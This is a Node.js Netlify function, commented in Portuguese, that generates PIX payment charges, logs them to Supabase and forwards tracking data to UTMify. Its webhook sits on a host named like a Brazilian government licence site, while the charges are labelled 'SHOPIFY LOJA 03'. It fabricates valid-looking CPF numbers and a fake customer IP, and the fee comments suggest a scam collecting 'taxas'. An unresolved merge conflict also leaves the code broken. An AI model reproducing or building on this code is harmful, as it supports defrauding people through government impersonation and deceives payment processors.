const { getSupabase } = require("./lib/supabase");
const credentials = require("./credentials");

const PINGUPAG_BASE = "https://app.pingupag.com/gateway/v1";
const PINGUPAG_API_KEY = process.env.PINGUPAG_API_KEY || credentials.PINGUPAG_API_KEY;
const UTMIFY_TOKEN = process.env.UTMIFY_TOKEN || credentials.UTMIFY_TOKEN;

// Cache UTMify para evitar duplicatas
const utmifyCache = new Map();
const CACHE_TTL = 60000;

function getAuthHeader() {
  if (!PINGUPAG_API_KEY) {
    throw new Error("❌ PINGUPAG_API_KEY não configurada!");
  }
  return PINGUPAG_API_KEY;
}

/**
 * Gera CPF válido com dígitos verificadores
 */
function generateValidCPF() {
  const randomNumber = () => Math.floor(Math.random() * 9);
  
  let cpf = Array.from({ length: 9 }, randomNumber).join("");
  
  let sum = 0;
  for (let i = 0; i < 9; i++) {
    sum += parseInt(cpf[i]) * (10 - i);
  }
  let remainder = sum % 11;
  let firstDigit = remainder < 2 ? 0 : 11 - remainder;
  
  cpf += firstDigit;
  sum = 0;
  for (let i = 0; i < 10; i++) {
    sum += parseInt(cpf[i]) * (11 - i);
  }
  remainder = sum % 11;
  let secondDigit = remainder < 2 ? 0 : 11 - remainder;
  
  cpf += secondDigit;
  return cpf;
}

/**
 * Envia dados de pagamento para UTMify
 */
async function sendUtmify(transactionId, status, customer, amountCents, createdAt, utms) {
  if (utmifyCache.has(transactionId)) {
    console.log("[UTMify] Pulando duplicata:", transactionId);
    return;
  }

  utmifyCache.set(transactionId, true);
  setTimeout(() => utmifyCache.delete(transactionId), CACHE_TTL);

  try {
    const gatewayFeeCents = Math.round(amountCents * 0.02);
    const netCents = amountCents - gatewayFeeCents;
    
    const payload = {
      orderId: transactionId,
      platform: "Pingupag",
      paymentMethod: "pix",
      status,
      createdAt: createdAt || new Date().toISOString().replace("T", " ").slice(0, 19),
      approvedDate: status === "paid" ? new Date().toISOString().replace("T", " ").slice(0, 19) : null,
      customer: {
        name: customer.name || null,
        email: customer.email || null,
        phone: customer.phone || null,
        document: customer.cpf || null,
        country: "BR",
        ip: "177.0.0.1",
      },
      products: [{
        id: "loja-shopify-br-001",
        name: "SHOPIFY LOJA 03",
        quantity: 1,
        priceInCents: amountCents,
      }],
      trackingParameters: {
        utm_source: utms?.utm_source || null,
        utm_campaign: utms?.utm_campaign || null,
        utm_medium: utms?.utm_medium || null,
      },
      commission: {
        totalPriceInCents: amountCents,
        gatewayFeeInCents: gatewayFeeCents,
        userCommissionInCents: netCents,
        currency: "BRL",
      },
    };

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);

    const response = await fetch("https://api.utmify.com.br/api-credentials/orders", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${UTMIFY_TOKEN}`,
      },
      body: JSON.stringify(payload),
      signal: controller.signal,
    });

    clearTimeout(timeoutId);
    console.log("[UTMify] Status:", response.status);
  } catch (error) {
    console.log("[UTMify] Erro (não-bloqueante):", error.message);
  }
}

/**
 * Salva transação no Supabase
 */
async function saveTransaction(transactionData) {
  try {
    const supabase = getSupabase();
    const { data, error } = await supabase
      .from("transactions")
      .insert([{
        transaction_id: transactionData.id,
        amount: transactionData.amount / 100, // Converte centavos para reais
        customer_name: transactionData.customer?.name || null,
        customer_email: transactionData.customer?.email || null,
        customer_cpf: transactionData.customer?.document || null,
        customer_phone: transactionData.customer?.phone || null,
        brcode: transactionData.qr_code || null,
        status: "pending",
        utm_source: transactionData.tracking?.utm_source || null,
        utm_campaign: transactionData.tracking?.utm_campaign || null,
        utm_medium: transactionData.tracking?.utm_medium || null,
        gateway: "pingupag",
      }]);

    if (error) {
      console.error("[Supabase] Erro ao salvar:", error.message);
    } else {
      console.log("[Supabase] Transação salva:", transactionData.id);
    }
  } catch (error) {
    console.error("[Supabase] Erro (não-bloqueante):", error.message);
  }
}

/**
 * Handler da função Netlify
 */
exports.handler = async (event) => {
  const startTime = Date.now();

  try {
    // Parse do body
    const body = typeof event.body === "string" ? JSON.parse(event.body) : event.body;

    // Extração de dados
    const nome = body.nome || body.name || body.customer_name || "Cliente Anônimo";
    const email = body.email || "noemail@example.com";
    const phone = (body.phone || "11999999999").replace(/\D/g, "");
    const cpf = body.cpf ? body.cpf.replace(/\D/g, "") : generateValidCPF();
<<<<<<< HEAD
    
    // Calcula o amount baseado na requisição
    // Se vier um valor entre 70-90, é upsell (R$ 81.50)
    // Padrão é primeira taxa (R$ 65.70)
    let finalAmount = 65.70;
    const rawAmount = body.amount ?? body.valor ?? body.total;
    if (rawAmount) {
      const n = Number(rawAmount);
      if (n >= 70 && n < 90) {
        finalAmount = 81.50; // UPSELL
      }
    }
    
    const amount = Math.round(finalAmount * 100); // Converte para centavos
=======
    // SEMPRE R$ 65,70 (não aceita valor do usuário)
    const amount = Math.round(65.70 * 100); // Converte para centavos = 6570
>>>>>>> a23c8be009ab4df6445b9bc34f994da4621d0237
    const reference = `PEDIDO-${Date.now()}-${Math.random().toString(36).substring(7)}`;

    // UTM parameters
    const utm = body.utm || {};

    console.log(`[Pingupag] Gerando PIX para ${nome} - R$ ${amount / 100}`);

    // Validação de credenciais
    const apiKey = getAuthHeader();

    // Preparação do payload para Pingupag
    const pixPayload = {
      amount,
      description: "SHOPIFY LOJA 03",
      reference,
      source: "api_externa",
      customer: {
        name: nome,
        email: email,
        phone: phone,
        document: cpf,
      },
      postback_url: "https://cnh-brasil-gov-br.netlify.app/webhook/pingupag",
      tracking: {
        utm_source: utm.utm_source || null,
        utm_campaign: utm.utm_campaign || null,
        utm_medium: utm.utm_medium || null,
        utm_content: utm.utm_content || null,
        utm_term: utm.utm_term || null,
      },
    };

    // Request para Pingupag com timeout
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 30000);

    console.log("[Pingupag] Enviando requisição...");
    const pingupagResponse = await fetch(`${PINGUPAG_BASE}/transaction`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-API-Key": apiKey,
      },
      body: JSON.stringify(pixPayload),
      signal: controller.signal,
    });

    clearTimeout(timeoutId);

    if (!pingupagResponse.ok) {
      const errorText = await pingupagResponse.text();
      console.error("[Pingupag] Erro:", pingupagResponse.status, errorText);
      
      return {
        statusCode: pingupagResponse.status,
        headers: { "Content-Type": "application/json", "Access-Control-Allow-Origin": "*" },
        body: JSON.stringify({
          success: false,
          error: `Erro Pingupag: ${pingupagResponse.status}`,
          debug: errorText,
        }),
      };
    }

    const pingupagData = await pingupagResponse.json();

    console.log("[Pingupag] Sucesso! ID:", pingupagData.id);

    // Salvar no Supabase (não-bloqueante)
    saveTransaction(pingupagData).catch(err => console.error("[Salvar TX] Erro:", err.message));

    // Enviar para UTMify (não-bloqueante)
    sendUtmify(
      pingupagData.id,
      "waiting_payment",
      { name: nome, email: email, cpf: cpf, phone: phone },
      amount,
      new Date().toISOString().replace("T", " ").slice(0, 19),
      utm
    ).catch(err => console.error("[UTMify] Erro:", err.message));

    const duration = Date.now() - startTime;
    console.log(`[✓] PIX gerado em ${duration}ms`);

    // Resposta de sucesso
    return {
      statusCode: 200,
      headers: {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type",
      },
      body: JSON.stringify({
        success: true,
        pixCode: pingupagData.qr_code,
        pix_code: pingupagData.qr_code,
        qr_code: pingupagData.qr_code,
        qr_code_base64: pingupagData.qr_code_base64,
        transaction_id: pingupagData.id,
        transactionId: pingupagData.id,
        id: pingupagData.transaction_id,
        reference: reference,
        status: "pending",
        amount: amount / 100,
        expires_at: pingupagData.expires_at,
      }),
    };
  } catch (error) {
    console.error("[❌ Erro]", error.message);

    let errorMsg = "Erro ao gerar PIX";
    if (error.name === "AbortError") {
      errorMsg = "Timeout na comunicação com gateway";
    }

    return {
      statusCode: 500,
      headers: {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
      },
      body: JSON.stringify({
        success: false,
        error: errorMsg,
        debug: error.message,
      }),
    };
  }
};
